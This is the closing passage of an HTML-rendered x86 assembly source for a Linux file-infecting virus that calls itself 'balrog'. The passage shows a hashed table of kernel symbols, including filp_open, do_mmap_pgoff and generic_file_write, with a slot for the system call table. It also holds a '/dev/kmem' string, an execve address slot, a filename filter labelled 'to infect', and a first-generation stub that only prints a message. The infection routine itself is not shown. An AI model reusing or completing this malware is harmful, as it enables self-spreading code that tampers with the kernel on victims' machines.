</span><span class="sc5">@do_brk</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">5a63f0b1h</span><span class="sc1">;"do_brk",0</span><span class="sc0">
</span><span class="sc5">@mmap</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">28b47165h</span><span class="sc1">;"do_mmap_pgoff",0</span><span class="sc0">
</span><span class="sc5">@munmap</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0fe260533h</span><span class="sc1">;"do_munmap",0</span><span class="sc0">
</span><span class="sc5">@read</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0ee9a23dch</span><span class="sc1">;"generic_file_read",0</span><span class="sc0">
</span><span class="sc5">@write</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">243db4e9h</span><span class="sc1">;"generic_file_write",0</span><span class="sc0">
</span><span class="sc5">@open</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">780d715ah</span><span class="sc1">;"filp_open",0</span><span class="sc0">
</span><span class="sc5">@close</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">69c43909h</span><span class="sc1">;"filp_close",0</span><span class="sc0">
</span><span class="sc5">@llseek</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">03d5198eh</span><span class="sc1">;"default_llseek",0</span><span class="sc0">
</span><span class="sc5">@printk</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">6c356a2eh</span><span class="sc1">;"printk",0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0BBh</span><span class="sc0">
</span><span class="sc5">@@Offsetz</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">_sys_call_table</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_KMalloc</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_KFree</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_DoBrk</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_MMap</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_MunMap</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_Read</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_Write</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_Open</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_Close</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_LlSeek</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">_Printk</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc9">%ifdef</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
</span><span class="sc1">;filter of filename to infect : 4 car only (1 dword)</span><span class="sc0">
</span><span class="sc5">sz_filter</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"./ha"</span><span class="sc0">
</span><span class="sc9">%endif</span><span class="sc0">

</span><span class="sc1">; common data</span><span class="sc0">
</span><span class="sc5">FileHandle</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">FileLength</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">MapHandle</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">MapSize</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">FileSize</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">DevKmemFile</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"/dev/kmem"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Kspace</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ExecveAdr</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc5">_end</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;</span><span class="sc0">
</span><span class="sc1">; First generation                                                         ;</span><span class="sc0">
</span><span class="sc1">;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;</span><span class="sc0">
</span><span class="sc5">first_msg</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"this is balrog first generation stub!"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">first_msg_len</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">first_msg</span><span class="sc0">

</span><span class="sc5">first_generation</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OF</span><span class="sc4">+</span><span class="sc5">first_msg_len</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">OF</span><span class="sc4">+</span><span class="sc5">first_msg</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc1">;stdout</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">SYS_write</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">SYS_exit</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">

</span><span class="sc1">;  _____                  ______       ___   ___</span><span class="sc0">
</span><span class="sc1">; /     \_  ______ __ __ /     /~|_ ___\_ \ /  /___</span><span class="sc0">
</span><span class="sc1">; |  _  /_|/  __  \  '  V  ___/  _/  __  \ '  /    \
; |  __/  |   ____/  |  |___  \  |   ____/   /  --  \
; |__| |__|\______/__|__|_____/__|\_____/\__/\______/</span><span class="sc0">

</span></div></body>
</html>
